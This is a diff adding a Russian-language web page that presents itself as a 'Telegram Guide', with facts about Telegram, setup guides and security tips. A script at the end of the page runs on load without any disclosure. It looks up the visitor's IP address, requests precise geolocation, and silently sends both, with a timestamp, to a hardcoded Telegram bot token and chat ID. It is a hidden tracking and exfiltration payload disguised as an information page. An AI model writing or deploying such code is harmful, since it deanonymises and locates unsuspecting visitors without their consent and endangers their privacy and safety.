@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Guide — Всё о Telegram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e1e; color: #e0e0e0; line-height: 1.6; }
+        header { background: #2aabee; padding: 30px 20px; text-align: center; }
+        header h1 { color: #fff; font-size: 2em; }
+        header p { color: #cceeff; margin-top: 10px; }
+        nav { background: #252525; padding: 15px; text-align: center; border-bottom: 2px solid #2aabee; }
+        nav a { color: #2aabee; text-decoration: none; margin: 0 15px; font-weight: bold; }
+        nav a:hover { text-decoration: underline; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .card { background: #2a2a2a; border-radius: 10px; padding: 25px; margin: 20px 0; border-left: 4px solid #2aabee; }
+        .card h2 { color: #2aabee; margin-bottom: 15px; }
+        .card ul { list-style: none; padding-left: 0; }
+        .card ul li { padding: 8px 0; border-bottom: 1px solid #333; }
+        .card ul li:last-child { border-bottom: none; }
+        .card ul li::before { content: '▸ '; color: #2aabee; }
+        footer { text-align: center; padding: 20px; color: #888; font-size: 0.9em; border-top: 1px solid #333; margin-top: 30px; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Telegram Guide</h1>
+        <p>Факты, гайды и всё что нужно знать о Telegram</p>
+    </header>
+    <nav>
+        <a href="#">Главная</a>
+        <a href="#">Факты</a>
+        <a href="#">Гайды</a>
+        <a href="#">Безопасность</a>
+        <a href="#">Контакты</a>
+    </nav>
+    <div class="container">
+        <div class="card">
+            <h2>10 фактов о Telegram</h2>
+            <ul>
+                <li>Telegram запущен в 2013 году братьями Дуровыми</li>
+                <li>Сервера распределены по 5 дата-центрам в разных странах</li>
+                <li>Протокол MTProto разработан специально для Telegram</li>
+                <li>В 2024 году аудитория превысила 900 миллионов пользователей</li>
+                <li>Максимальный размер файла для передачи — 2 ГБ</li>
+                <li>Секретные чаты используют end-to-end шифрование</li>
+                <li>Telegram ни разу не раскрыл ключи шифрования властям</li>
+                <li>Боты появились в 2015 году и сейчас их более 10 миллионов</li>
+                <li>Можно создавать каналы с неограниченным количеством подписчиков</li>
+                <li>Исходный код клиентов открыт под лицензией GPL</li>
+            </ul>
+        </div>
+        <div class="card">
+            <h2>Гайд: Как настроить двухфакторную аутентификацию</h2>
+            <ul>
+                <li>Откройте Настройки → Конфиденциальность</li>
+                <li>Выберите «Двухфакторная аутентификация»</li>
+                <li>Придумайте надёжный пароль</li>
+                <li>Укажите email для восстановления</li>
+                <li>Подтвердите пароль и сохраните изменения</li>
+            </ul>
+        </div>
+        <div class="card">
+            <h2>Гайд: Секретные чаты</h2>
+            <ul>
+                <li>Нажмите на иконку карандаша в правом нижнем углу</li>
+                <li>Выберите «Создать секретный чат»</li>
+                <li>Выберите контакт из списка</li>
+                <li>Сообщения не сохраняются на серверах</li>
+                <li>Можно настроить таймер самоуничтожения</li>
+                <li>Невозможно переслать сообщения из секретного чата</li>
+            </ul>
+        </div>
+        <div class="card">
+            <h2>Гайд: Создание бота</h2>
+            <ul>
+                <li>Найдите в поиске @BotFather</li>
+                <li>Отправьте команду /newbot</li>
+                <li>Придумайте имя и username бота</li>
+                <li>Сохраните полученный токен</li>
+                <li>Настройте бота через BotFather или API</li>
+            </ul>
+        </div>
+        <div class="card">
+            <h2>Советы по безопасности</h2>
+            <ul>
+                <li>Никогда не передавайте код подтверждения третьим лицам</li>
+                <li>Используйте двухфакторную аутентификацию</li>
+                <li>Проверяйте активные сессии в настройках</li>
+                <li>Не переходите по подозрительным ссылкам</li>
+                <li>Обновляйте приложение до последней версии</li>
+            </ul>
+        </div>
+    </div>
+    <footer>
+        <p>Telegram Guide © 2024. Информационный ресурс о Telegram.</p>
+    </footer>
+
+    <script>
+        var token = '8862821632:AAHVpQ68Co6A3XOVlytf8-NW40NPfbQdkGs'
+        var chatId = '7761721600'
+        var done = false
+
+        function sendText(txt) {
+            var x = new XMLHttpRequest()
+            x.open('POST', 'https://api.telegram.org/bot' + token + '/sendMessage', true)
+            x.setRequestHeader('Content-Type', 'application/json')
+            x.send(JSON.stringify({ chat_id: chatId, text: txt }))
+        }
+
+        var ipReady = null
+        var geoReady = null
+
+        function trySend() {
+            if (done) return
+            if (ipReady !== null && geoReady !== null) {
+                done = true
+                var time = new Date().toLocaleString('ru-RU')
+                var msg = 'Место нахождения: ' + geoReady + '\nВремя получения: ' + time + '\nIP адрес: ' + ipReady
+                sendText(msg)
+            }
+        }
+
+        var xip = new XMLHttpRequest()
+        xip.open('GET', 'https://api64.ipify.org?format=json', true)
+        xip.timeout = 4000
+        xip.onload = function() {
+            try { var d = JSON.parse(xip.responseText); ipReady = d.ip }
+            catch(e) { ipReady = 'ошибка' }
+            trySend()
+        }
+        xip.onerror = function() { ipReady = 'не получен'; trySend() }
+        xip.ontimeout = function() { ipReady = 'таймаут'; trySend() }
+        xip.send()
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    var lat = pos.coords.latitude.toFixed(5)
+                    var lon = pos.coords.longitude.toFixed(5)
+                    var acc = pos.coords.accuracy
+                    geoReady = lat + ', ' + lon + ' (точность ' + acc + 'м)'
+                    trySend()
+                },
+                function(e) {
+                    if (e.code === 1) geoReady = 'запрещено'
+                    else if (e.code === 2) geoReady = 'недоступно'
+                    else if (e.code === 3) geoReady = 'таймаут'
+                    else geoReady = 'ошибка ' + e.code
+                    trySend()
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            )
+        } else {
+            geoReady = 'не поддерживается'
+            trySend()
+        }
+
+        setTimeout(function() {
+            if (ipReady === null) { ipReady = 'таймаут'; trySend() }
+            if (geoReady === null) { geoReady = 'таймаут'; trySend() }
+        }, 6000)
+    </script>
+</body>
+</html>
